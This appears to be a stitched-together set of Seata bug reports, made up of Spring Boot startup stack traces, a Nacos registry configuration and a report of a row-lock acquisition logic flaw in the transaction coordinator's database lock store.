org.springframework.beans.factory.support.defaultlistablebeanfactory.addcandidateentry(defaultlistablebeanfactory.java:1314) at org.springframework.beans.factory.support.defaultlistablebeanfactory.findautowirecandidates(defaultlistablebeanfactory.java:1280) at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvemultiplebeans(defaultlistablebeanfactory.java:1178) at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1094) at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1064) at org.springframework.beans.factory.support.constructorresolver.resolveautowiredargument(constructorresolver.java:835) at org.springframework.beans.factory.support.constructorresolver.createargumentarray(constructorresolver.java:741) ..
36 common frames omitted
caused by: org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.web.servlet.mvc.method.annotation.requestmappinghandlermapping]: factory method 'requestmappinghandlermapping' threw exception; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'mvcconversionservice' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:189) at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:588) ..
52 common frames omitted
caused by: org.springframework.beans.factory.beancreationexception: error creating bean with name 'mvcconversionservice' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:599) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.instantiateusingfactorymethod(abstractautowirecapablebeanfactory.java:1178) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1072) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:511) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:481) at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:312) at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:308) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:197) at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.obtainbeaninstancefromfactory(configurationclassenhancer.java:389) at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.intercept(configurationclassenhancer.java:361) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26.mvcconversionservice(<generated>) at org.springframework.web.servlet.config.annotation.webmvcconfigurationsupport.getinterceptors(webmvcconfigurationsupport.java:307) at org.springframework.web.servlet.config.annotation.webmvcconfigurationsupport.requestmappinghandlermapping(webmvcconfigurationsupport.java:258) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration.requestmappinghandlermapping(webmvcautoconfiguration.java:403) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26.cglib$requestmappinghandlermapping$2(<generated>) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26$$fastclassbyspringcglib$$6aaa3019.invoke(<generated>) at org.springframework.cglib.proxy.methodproxy.invokesuper(methodproxy.java:228) at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.intercept(configurationclassenhancer.java:358) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26.requestmappinghandlermapping(<generated>) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:162) ..
53 common frames omitted
caused by: org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:189) at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:588) ..
77 common frames omitted
caused by: java.lang.abstractmethoderror: null at org.springframework.web.servlet.config.annotation.webmvcconfigurercomposite.addformatters(webmvcconfigurercomposite.java:80) at org.springframework.web.servlet.config.annotation.delegatingwebmvcconfiguration.addformatters(delegatingwebmvcconfiguration.java:77) at org.springframework.web.servlet.config.annotation.webmvcconfigurationsupport.mvcconversionservice(webmvcconfigurationsupport.java:600) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26.cglib$mvcconversionservice$32(<generated>) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26$$fastclassbyspringcglib$$6aaa3019.invoke(<generated>) at org.springframework.cglib.proxy.methodproxy.invokesuper(methodproxy.java:228) at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.intercept(configurationclassenhancer.java:358) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26.mvcconversionservice(<generated>) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:162) ..
78 common frames omitted
disconnected from the target vm, address: '127.0.0.1:63968', transport: 'socket' ``` ```
``` org.springframework.beans.factory.beancreationexception: error creating bean with name 'globaltransactionscanner' defined in class path resource [com/vivo/it/boot/framework/config/datasourceconfigure.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [io.seata.spring.annotation.globaltransactionscanner]: factory method 'globaltransactionscanner' threw exception; nested exception is io.seata.common.loader.enhancedservicenotfoundexception: not found service provider for : io.seata.config.configurationprovider[nacos] and classloader : sun.misc.launcher$appclassloader@73d16e93 at org.springframework.beans.factory.support.constructorresolver.instantiate(constructorresolver.java:625) at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:455) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.instantiateusingfactorymethod(abstractautowirecapablebeanfactory.java:1288) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1127) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:538) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:498) at org.springframework.beans.factory.support.abstractbeanfactory.lambda$dogetbean$0(abstractbeanfactory.java:320) at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:222) at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:318) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:204) at org.springframework.context.support.postprocessorregistrationdelegate.registerbeanpostprocessors(postprocessorregistrationdelegate.java:228) at org.springframework.context.support.abstractapplicationcontext.registerbeanpostprocessors(abstractapplicationcontext.java:707) at org.springframework.context.support.abstractapplicationcontext.refresh(abstractapplicationcontext.java:531) at org.springframework.boot.web.servlet.context.servletwebserverapplicationcontext.refresh(servletwebserverapplicationcontext.java:140) at org.springframework.boot.springapplication.refresh(springapplication.java:775) at org.springframework.boot.springapplication.refreshcontext(springapplication.java:397) at org.springframework.boot.springapplication.run(springapplication.java:316) at org.springframework.boot.springapplication.run(springapplication.java:1260) at org.springframework.boot.springapplication.run(springapplication.java:1248) at com.vivo.it.test1.testdubboservice1application.main(testdubboservice1application.java:39)
caused by: org.springframework.beans.beaninstantiationexception: failed to instantiate [io.seata.spring.annotation.globaltransactionscanner]: factory method 'globaltransactionscanner' threw exception; nested exception is io.seata.common.loader.enhancedservicenotfoundexception: not found service provider for : io.seata.config.configurationprovider[nacos] and classloader : sun.misc.launcher$appclassloader@73d16e93 at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:185) at org.springframework.beans.factory.support.constructorresolver.instantiate(constructorresolver.java:620) ..
19 common frames omitted
caused by: io.seata.common.loader.enhancedservicenotfoundexception: not found service provider for : io.seata.config.configurationprovider[nacos] and classloader : sun.misc.launcher$appclassloader@73d16e93 ``` ```
registry { # file acos ureka edis k type = "nacos" nacos { serveraddr = "172.20.226.105,172.20.226.106,172.20.226.107" namespace = "public" cluster = "default" } eureka { serviceurl = " " application = "default" weight = "1" } redis { serveraddr = "localhost:6379" db = "0" } zk { cluster = "default" serveraddr = "127.0.0.1:2181" session.timeout = 6000 connect.timeout = 2000 } file { name = "file.conf" }
} config { # file acos pollo k type = "nacos" nacos { serveraddr = "172.20.226.105,172.20.226.106,172.20.226.107" namespace = "public" cluster = "default" } apollo { app.id = "fescar-server" apollo.meta = " " } zk { serveraddr = "127.0.0.1:2181" session.timeout = 6000 connect.timeout = 2000 } file { name = "file.conf" }
there are two rm in a global transaction
the first rm inserts a record, the second rm updated this record and another reocord **in a local transaction**.
when i pause global transaction after phase1 completed and before start phase2 where global lock isnot released
i find there is only one global lock record in tc's lock_table for the inserted record
i check the code for acquiring lock in db mode, class `lockstoredatabasedao.class`, method `public boolean acquirelock(list<lockdo> lockdos)`, line 113 to line 135: ``` //query string checklocksql = lockstoresqls.getchecklockablesql(locktable, sb.tostring(), dbtype); ps = conn.preparestatement(checklocksql); for (int i = 0; i < lockdos.size(); i++) { ps.setstring(i + 1, lockdos.get(i).getrowkey()); } rs = ps.executequery(); while (rs.next()) { if (stringutils.equals(rs.getstring("xid"), lockdos.get(0).getxid())) { isrelock = true; } else { canlock &= false; } } if (!canlock) { conn.rollback(); return false; } if (isrelock) { conn.rollback(); return true; } ```
there is a logic problem when rm try to acquire lock including the ones are acquired and the other are not acquired at the same time
tc find there exist relock so it jump out without acquring the other lock
environment: - jdk version : jdk1.8
- os : linux
- others: seata 0.6.1
error starting applicationcontext
to display the conditions report re-run your application with 'debug' enabled.\x1b[0;39m [ ] [main] \x1b[34minfo \x1b[0;39m \x1b[36mo.a.d.s.b.c.e.awaitingnonwebapplicationlistener\x1b[0;39m - \x1b[34m [dubbo] current spring boot application is about to shutdown...\x1b[0;39m [ ] [main] \x1b[1;31merror\x1b[0;39m \x1b[36mo.s.b.springapplication\x1b[0;39m - \x1b[1;31mapplication run failed\x1b[0;39m org.springframework.beans.factory.beancreationexception: error creating bean with name 'globaltransactionscanner' defined in class path resource [com/vivo/it/test1/config/seataautoconfig.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [io.seata.spring.annotation.globaltransactionscanner]: factory method 'globaltransactionscanner' threw exception; nested exception is io.seata.common.exception.notsupportyetexception: not support register type: null at org.springframework.beans.factory.support.constructorresolver.instantiate(constructorresolver.java:625) at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:455) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.instantiateusingfactorymethod(abstractautowirecapablebeanfactory.java:1288) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1127) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:538) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:498) at org.springframework.beans.factory.support.abstractbeanfactory.lambda$dogetbean$0(abstractbeanfactory.java:320) at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:222) at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:318) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:204) at org.springframework.context.support.postprocessorregistrationdelegate.registerbeanpostprocessors(postprocessorregistrationdelegate.java:228) at org.springframework.context.support.abstractapplicationcontext.registerbeanpostprocessors(abstractapplicationcontext.java:707) at org.springframework.context.support.abstractapplicationcontext.refresh(abstractapplicationcontext.java:531) at org.springframework.boot.web.servlet.context.servletwebserverapplicationcontext.refresh(servletwebserverapplicationcontext.java:140) at org.springframework.boot.springapplication.refresh(springapplication.java:775) at org.springframework.boot.springapplication.refreshcontext(springapplication.java:397) at org.springframework.boot.springapplication.run(springapplication.java:316) at org.springframework.boot.springapplication.run(springapplication.java:1260) at org.springframework.boot.springapplication.run(springapplication.java:1248) at com.vivo.it.test1.testdubboservice1application.main(testdubboservice1application.java:37)
caused by: org.springframework.beans.beaninstantiationexception: failed to instantiate [io.seata.spring.annotation.globaltransactionscanner]: factory method 'globaltransactionscanner' threw exception; nested exception is io.seata.common.exception.notsupportyetexception: not support register type: null at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:185) at org.springframework.beans.factory.support.constructorresolver.instantiate(constructorresolver.java:620) ..
19 common frames omitted
caused by: io.seata.common.exception.notsupportyetexception: not support register type: null at io.seata.config.configurationfactory.buildconfiguration(configurationfactory.java:80) at io.seata.config.configurationfactory.getinstance(configurationfactory.java:65) at io.seata.spring.annotation.globaltransactionscanner.<init>(globaltransactionscanner.java:81) at io.seata.spring.annotation.globaltransactionscanner.<init>(globaltransactionscanner.java:124) at io.seata.spring.annotation.globaltransactionscanner.<init>(globaltransactionscanner.java:113) at com.vivo.it.test1.config.seataautoconfig.globaltransactionscanner(seataautoconfig.java:44) at com.vivo.it.test1.config.seataautoconfig$$enhancerbyspringcglib$$6687f6de.cglib$globaltransactionscanner$0(<generated>) at com.vivo.it.test1.config.seataautoconfig$$enhancerbyspringcglib$$6687f6de$$fastclassbyspringcglib$$e469024b.invoke(<generated>) at org.springframework.cglib.proxy.methodproxy.invokesuper(methodproxy.java:244) at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.intercept(configurationclassenhancer.java:363) at com.vivo.it.test1.config.seataautoconfig$$enhancerbyspringcglib$$6687f6de.globaltransactionscanner(<generated>) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(unknown source) at sun.reflect.delegatingmethodaccessorimpl.invoke(unknown source) at java.lang.reflect.method.invoke(unknown source) at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:154) ..
20 common frames omitted
caused by: java.lang.illegalargumentexception: illegal type:null at io.seata.config.configtype.gettype(configtype.java:62) at io.seata.config.configurationfactory.buildconfiguration(configurationfactory.java:78) ..
35 common frames omitted ```
org.springframework.jdbc.uncategorizedsqlexception: ### error updating database
cause: java.sql.sqlexception: io.seata.core.exception.transactionexception: response[runtimeexception[null]]
### the error may exist in cn/rctech/egg/training/mapper/articlemapper.java (best guess)
### the error may involve cn.rctech.egg.training.mapper.articlemapper.insert-inline
### the error occurred while setting parameters
### sql: insert into egg_training_camp_article ( id, user_id, title, article_url, image_urls, article_type, status ) values ( ?, ?, ?, ?, ?, ?, ? )
### cause: java.sql.sqlexception: io.seata.core.exception.transactionexception: response[runtimeexception[null]]
; uncategorized sqlexception; sql state [null]; error code [0]; io.seata.core.exception.transactionexception: response[runtimeexception[null]]; nested exception is java.sql.sqlexception: io.seata.core.exception.transactionexception: response[runtimeexception[null]] at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:89) ~[spring-jdbc-5.1.6.release.jar:5.1.6.release] at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) ~[spring-jdbc-5.1.6.release.jar:5.1.6.release] at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) ~[spring-jdbc-5.1.6.release.jar:5.1.6.release] at org.mybatis.spring.mybatisexceptiontranslator.translateexceptionifpossible(mybatisexceptiontranslator.java:73) ~[mybatis-spring-2.0.1.jar:2.0.1] at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:446) ~[mybatis-spring-2.0.1.jar:2.0.1] at com.sun.proxy.$proxy112.insert(unknown source) ~[na:na] at org.mybatis.spring.sqlsessiontemplate.insert(sqlsessiontemplate.java:278) ~[mybatis-spring-2.0.1.jar:2.0.1] at com.baomidou.mybatisplus.core.override.mybatismappermethod.execute(mybatismappermethod.java:58) ~[mybatis-plus-core-3.1.1.jar:3.1.1] at com.baomidou.mybatisplus.core.override.mybatismapperproxy.invoke(mybatismapperproxy.java:62) ~[mybatis-plus-core-3.1.1.jar:3.1.1] at com.sun.proxy.$proxy113.insert(unknown source) ~[na:na] at com.baomidou.mybatisplus.extension.service.impl.serviceimpl.save(serviceimpl.java:109) ~[mybatis-plus-extension-3.1.1.jar:3.1.1] at cn.rctech.egg.training.service.impl.articleserviceimpl.publisharticle(articleserviceimpl.java:57) ~[classes/:na] at cn.rctech.egg.training.service.impl.articleserviceimpl$$fastclassbyspringcglib$$f770150d.invoke(<generated>) ~[classes/:na] at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:218) ~[spring-core-5.1.6.release.jar:5.1.6.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:749) ~[spring-aop-5.1.6.release.jar:5.1.6.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) ~[spring-aop-5.1.6.release.jar:5.1.6.release] at io.seata.spring.annotation.globaltransactionalinterceptor.lambda$handlegloballock$0(globaltransactionalinterceptor.java:89) ~[seata-spring-0.6.1.jar:na] at io.seata.rm.globallocktemplate.execute(globallocktemplate.java:46) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.spring.annotation.globaltransactionalinterceptor.handlegloballock(globaltransactionalinterceptor.java:87) ~[seata-spring-0.6.1.jar:na] at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:80) ~[seata-spring-0.6.1.jar:na] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.1.6.release.jar:5.1.6.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:688) ~[spring-aop-5.1.6.release.jar:5.1.6.release] at cn.rctech.egg.training.service.impl.articleserviceimpl$$enhancerbyspringcglib$$97ae5f7d.publisharticle(<generated>) ~[classes/:na] at cn.rctech.egg.training.controller.articlecontroller.publisharticle(articlecontroller.java:52) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_191] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_191] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_191] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_191] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:189) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:138) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:102) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:892) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:797) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1038) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:942) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:1005) [spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:908) [spring-webmvc-5.1.6.release.jar:5.1.6.release] at javax.servlet.http.httpservlet.service(httpservlet.java:660) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:882) [spring-webmvc-5.1.6.release.jar:5.1.6.release] at javax.servlet.http.httpservlet.service(httpservlet.java:741) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) [tomcat-embed-websocket-9.0.19.jar:9.0.19] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.springframework.web.filter.corsfilter.dofilterinternal(corsfilter.java:96) [spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) [spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:320) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.access.intercept.filtersecurityinterceptor.invoke(filtersecurityinterceptor.java:127) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.access.intercept.filtersecurityinterceptor.dofilter(filtersecurityinterceptor.java:91) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.access.exceptiontranslationfilter.dofilter(exceptiontranslationfilter.java:119) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.authentication.anonymousauthenticationfilter.dofilter(anonymousauthenticationfilter.java:111) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.servletapi.securitycontextholderawarerequestfilter.dofilter(securitycontextholderawarerequestfilter.java:170) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) [spring-security-web-5.1.5.release.jar:5.1.5.release] at cn.rctech.egg.authorization.security.token.tokenauthenticationfilter.dofilterinternal(tokenauthenticationfilter.java:48) [authorization-service-web-api-1.0-20190608.080555-18.jar:na] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) [spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.context.securitycontextpersistencefilter.dofilter(securitycontextpersistencefilter.java:105) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.context.request.async.webasyncmanagerintegrationfilter.dofilterinternal(webasyncmanagerintegrationfilter.java:56) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) [spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.filterchainproxy.dofilterinternal(filterchainproxy.java:215) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.security.web.filterchainproxy.dofilter(filterchainproxy.java:178) [spring-security-web-5.1.5.release.jar:5.1.5.release] at org.springframework.web.filter.delegatingfilterproxy.invokedelegate(delegatingfilterproxy.java:357) [spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.filter.delegatingfilterproxy.dofilter(delegatingfilterproxy.java:270) [spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:99) [spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) [spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:92) [spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) [spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.springframework.web.filter.hiddenhttpmethodfilter.dofilterinternal(hiddenhttpmethodfilter.java:93) [spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) [spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:200) [spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) [spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:200) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:490) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.coyote.http11.http11processor.service(http11processor.java:408) [tomcat-embed-core-9.0.19.jar:9.0.19] at 